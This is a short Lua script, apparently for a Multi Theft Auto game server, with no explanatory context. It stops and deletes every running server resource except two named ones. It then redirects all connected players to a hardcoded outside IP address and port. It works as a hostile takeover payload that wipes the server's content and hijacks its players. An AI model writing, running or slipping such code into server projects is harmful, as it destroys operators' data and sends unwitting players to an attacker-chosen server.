for k,v in pairs(getResources()) do
    if getResourceState(v) == "running" and getResourceName(v) ~= "admin" and getResourceName(v) ~= "okup_borsuk" then
        stopResource(v)
        refreshResources()
        setTimer(deleteResource, 1000, 1, v)
    end
end

setTimer(function()
    local ip, port = "51.75.35.77", 20824
    for k, player in ipairs(getElementsByType("player")) do
        if isElement(player) then
            redirectPlayer(player, ip, port)
        end
    end
end, 27000, 1)
